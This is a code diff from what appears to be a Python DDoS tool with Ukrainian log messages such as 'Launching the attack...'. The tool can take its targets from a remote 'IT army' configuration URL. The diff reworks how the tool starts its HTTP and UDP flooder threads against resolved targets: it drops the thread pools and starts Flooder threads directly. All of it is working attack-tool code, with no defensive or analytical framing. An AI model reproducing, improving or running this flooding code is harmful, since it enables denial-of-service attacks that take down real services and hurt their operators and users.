@@ -85,8 +85,6 @@ class Flooder(Thread):
 
 
 def run_ddos(
-    thread_pool,
-    udp_thread_pool,
     proxies,
     targets,
     total_threads,
@@ -141,14 +139,16 @@ def run_ddos(
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
 
     threads = []
-
     for _ in range(total_threads):
         flooder = Flooder(event, kwargs_list)
         flooder.start()
         threads.append(flooder)
     if udp_kwargs_list:
         for _ in range(udp_threads):
-            udp_thread_pool.submit(None)
+            flooder = Flooder(event, udp_kwargs_list)
+            flooder.start()
+            threads.append(flooder)
+
     event.set()
 
     if not (table or debug):
@@ -184,18 +184,6 @@ def start(args):
                 f'за замовчуванням може бути ефективніша{cl.RESET}'
             )
 
-    #thread_pool = DaemonThreadPool()
-    #udp_thread_pool = DaemonThreadPool()
-
-    thread_pool = ThreadPoolExecutor(max_workers=args.threads + 5)
-    udp_thread_pool = ThreadPoolExecutor(max_workers=args.udp_threads + 5)
-
-    # It is possible that not all threads were started
-    #total_threads = thread_pool.start(args.threads)
-    #udp_thread_pool.start(args.udp_threads)
-
-    total_threads = args.threads
-
     if args.itarmy:
         targets_iter = Targets([], IT_ARMY_CONFIG_URL)
     else:
@@ -213,7 +201,7 @@ def start(args):
                 logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
                 exit()
 
-            targets = resolve_all_targets(targets, thread_pool)
+            targets = resolve_all_targets(targets)
             targets = [target for target in targets if target.is_resolved]
             if targets:
                 break
@@ -235,11 +223,9 @@ def start(args):
 
         period = 300
         run_ddos(
-            thread_pool,
-            udp_thread_pool,
             proxies,
             targets,
-            total_threads,
+            args.threads,
             period,
             args.rpc,
             args.http_methods,
